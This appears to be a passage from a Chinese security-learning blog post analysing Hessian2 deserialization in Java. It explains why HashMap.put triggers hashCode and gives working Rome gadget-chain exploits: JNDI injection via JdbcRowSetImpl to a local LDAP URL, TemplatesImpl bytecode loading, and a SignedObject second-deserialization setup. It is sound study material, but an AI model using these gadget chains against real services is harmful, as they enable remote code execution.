<p><code>HessianInput#readObject</code>部分代码如下,由于第一个每次都是77，所以都会进入该部分，在这获取了type</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230208225728424.png"
                      alt="image-20230208225728424"
                ></p>
<p>接着会进入<code>ObjectInputStream#readMap</code>通过<code>getDeserializer()</code>来获取一个<code>deserializer</code></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in, String type)</span> <span class="keyword">throws</span> HessianProtocolException, IOException &#123;</span><br><span class="line">        <span class="type">Deserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="built_in">this</span>.getDeserializer(type);</span><br><span class="line">        <span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> deserializer.readMap(in);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>._hashMapDeserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>._hashMapDeserializer.readMap(in);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>._hashMapDeserializer = <span class="keyword">new</span> <span class="title class_">MapDeserializer</span>(HashMap.class);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>._hashMapDeserializer.readMap(in);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 getDeserializer 方法中，主要的操作就是首先判断了type是否为null，然后通过这个type去默认的map中获取deserializer，最开始肯定是没有我们这个类的type的，可以看看默认有些啥，当然显然是不会有的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230208231744002.png"
                      alt="image-20230208231744002"
                ></p>
<p>然后判断是否为数组类型，显然我们本例不是，若是，则按数组进行处理。</p>
<p>最后上面的都不满足，则获取class，再进入<code>this.getDeserializer(Class)</code>再获取该类对应的Deserializer，这里是进入这里</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="built_in">this</span>.loadSerializedClass(type);</span><br><span class="line">                    deserializer = <span class="built_in">this</span>.getDeserializer(cl);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure></div>

<p>具体 <code>this.getDeserializer(Class)</code> 是怎么获取的就不去解析了，主要看紧接着的内容。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>._cachedTypeDeserializerMap == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>._cachedTypeDeserializerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">8</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">synchronized</span>(<span class="built_in">this</span>._cachedTypeDeserializerMap) &#123;</span><br><span class="line">                    <span class="built_in">this</span>._cachedTypeDeserializerMap.put(type, deserializer);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>大概目的就是在获取到<code>deserializer</code>后，java会创建一个HashMap作为缓存，并将我们需要反序列化的类作为<code>key</code>放入一个HashMap中。这里既然使用了HashMap的put方法，那么key的hashcode的方法就会被执行。这就是一个漏洞点。所以不同于我们以前默认的反序列化，这个 Hessian2 我们不是利用被序列化类的 readobject 方法，而是hashcode方法。</p>
<h2 id="归纳"><a href="#归纳" class="headerlink" title="归纳"></a>归纳</h2><p>Hessian 提供了一个 <code>_isAllowNonSerializable</code> 变量用来打破序列化类需要实现序列化接口的规范，可以使用 <code>SerializerFactory#setAllowNonSerializable</code> 方法将其设置为 true，从而使未实现 Serializable 接口的类也可以序列化和反序列化，换句话说，Hessian 实际支持反序列化任意类，无需实现 Serializable 接口。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p><strong>Hessian 对 Map 类型数据的处理上，<code>MapDeserializer#readMap</code> 对 Map 类型数据进行反序列化操作是会创建相应的 Map 对象，并将 Key 和 Value 分别反序列化后使用 put 方法写入数据。在没有指定 Map 的具体实现类时，将会默认使用 HashMap ，对于 SortedMap，将会使用 TreeMap。而众所周知， HashMap 在 put 键值对时，将会对 key 的 hashcode 进行校验查看是否有重复的 key 出现，这就将会调用 key 的 hasCode 方法</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1651123884314.png"
                      alt="img"
                ></p>
<p><strong>而 TreeMap 在 put 时，由于要进行排序，所以要对 key 进行比较操作，将会调用 compare 方法，会调用 key 的 compareTo 方法。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1651213661427.png"
                      alt="img"
                ></p>
</blockquote>
<p><strong>也就是说 Hessian 相对比原生反序列化的利用链，有几个限制：</strong></p>
<ul>
<li><strong>kick-off chain 起始方法只能为 hashCode&#x2F;equals&#x2F;compareTo 方法；</strong></li>
<li><strong>利用链中调用的成员变量不能为 transient 修饰；（后面rome演示）</strong></li>
<li><strong>所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter&#x2F;setter 的逻辑。</strong></li>
</ul>
<p>这几个限制也导致了很多 Java 原生反序列化利用链在 Hessian 中无法使用，有些链子中一些明明是 hashCode&#x2F;equals&#x2F;compareTo 触发的链子都不能直接拿来用。</p>
<h1 id="Rome-配合-Hessian2"><a href="#Rome-配合-Hessian2" class="headerlink" title="Rome 配合 Hessian2"></a>Rome 配合 Hessian2</h1><h2 id="打-jndi-注入"><a href="#打-jndi-注入" class="headerlink" title="打 jndi 注入"></a>打 jndi 注入</h2><p>这个在学Rome的时候没学到过，这里记录一下，实际上就 ToStringBean 会遍历所有无参getter 和setter，我们设置的JdbcRowSetImpl 类会去触发 getDatabaseMetaData ，从而触发jndi注入。不做过多解释（由于打jndi需要出网，一般情况下认为限制比较大）。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_jndi</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/w1lfvn&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class,<span class="string">&quot;hello! koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(equalsBean,<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">        <span class="comment">// 这里后续在反射修改回来，不然懂得懂得，在put就会触发利用链</span></span><br><span class="line">        setValue(equalsBean,<span class="string">&quot;_beanClass&quot;</span>, ToStringBean.class);</span><br><span class="line">        setValue(equalsBean,<span class="string">&quot;_obj&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hot</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(baos);</span><br><span class="line">        hot.writeObject(hashMap);</span><br><span class="line">        hot.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bais);</span><br><span class="line">        hit.readObject();</span><br><span class="line">        hit.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h2 id="🚩加载字节码（二次反序列化）"><a href="#🚩加载字节码（二次反序列化）" class="headerlink" title="🚩加载字节码（二次反序列化）"></a>🚩加载字节码（二次反序列化）</h2><p><strong>既然说到了hashcode方法，显然很容易想到Rome中的一个利用方式。（CC6好像也用的hashcode方法，后面研究研究看看。）</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure></div>

<p><strong>使用 EqualsBean 变式去触发</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_EqualsBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">//必须修改_bytecodes</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class,<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class,templates);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(templates,templates);</span><br><span class="line">        hashMap.put(bean,bean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里后续在反射修改回来，不然懂得懂得，在put就会触发利用链</span></span><br><span class="line">        setFieldValue(bean,<span class="string">&quot;_beanClass&quot;</span>,ObjectBean.class);</span><br><span class="line">        setFieldValue(bean,<span class="string">&quot;_obj&quot;</span>,objectBean);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hot</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(baos);</span><br><span class="line">        hot.writeObject(hashMap);</span><br><span class="line">        hot.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bais);</span><br><span class="line">        hit.readObject();</span><br><span class="line">        hit.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是在调试的时候，发现存在问题：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230209164320207.png"
                      alt="image-20230209164320207"
                ></p>
<p>到 defineTransletClasses 方法处，_tfactory 值为null，而我们此时又恰好为 java8，是需要该属性的。</p>
<p>这是因为<code>_tfactory</code>是一个transient修饰的属性，不会被反序列化。而在原生反序列化时，该属性是在<code>TemplatesImpl#readObject</code>中重新设置进去的。在hessian反序列化中读取属性时可以发现压根就没写入这个属性，导致空指针异常。</p>
<p><strong>原因是：在hessian序列化时，由 <code>UnsafeSerializer#introspect</code> 方法来获取对象中的字段，在老版本中应该是 <code>getFieldMap</code> 方法。依旧是判断了成员变量标识符，如果是 transient 和 static 字段则不会参与序列化反序列化流程。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/107563321d94b95289886d9d7f615782.png"
                      alt="image-20230202015021051"
                ></p>
<p>因此我们需要寻找向序列化流里面写入数据或者改变流内容的类。</p>
<h3 id="java-security-SignedObject"><a href="#java-security-SignedObject" class="headerlink" title="java.security.SignedObject"></a>java.security.SignedObject</h3><p>这个类有个 getObject 方法会从流里使用原生反序列化读取数据。我们只需找到能触发任意get的方法就能触发二次反序列化</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1651139384898.png"
                      alt="img"
                ></p>
<p>这个 SignedObject 反序列化的内容也是可控的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/dae46fcd0fd2ce47170e48bd1ec65340.png"
                      alt="img"
                ></p>
<p>问题又来了，为什么原生反序列化就可以恢复这个<code>trasient</code>修饰的变量呢？</p>
<p>因为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#readObject</code>,重写了readOBject方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/8.png"
                      alt="img"
                ></p>
<h3 id="获取-SignedObject-对象"><a href="#获取-SignedObject-对象" class="headerlink" title="获取 SignedObject 对象"></a>获取 SignedObject 对象</h3><p>由 SignedObject 构造器参数比较陌生，我这里写下几个获取的方法，获取SignedObject对象的方法有很多种</p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>比如公开面最广的：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">   kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">   <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">   <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(table1, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br></pre></td></tr></table></figure></div>



<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有其他方法，通过对 <a class="link"   target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec" >marshalsec <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的利用链的分析，可以看到其有一个工具类，可以写了不使用构造器去获取类对象的方法，调用createWithoutConstructor 方法即可获取对象。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">        <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">    <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;unchecked&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">        Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">    Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">    objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">    sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>其实还有个方法三，由于是个人学习发现的，本质上是等价于方法二的，这里就先不写了。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>通过上面的学习了解，我们就可以尝试构造出 payload 了。前面就正常扒Rome的链子，填入SignedObject，后面就用Hessian2去触发getter即可。比如下面我就用rome笔记中的第一个rome链来写。</p>
<p>个人感觉写的较冗长，不知道有没有可以优化的地方</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> 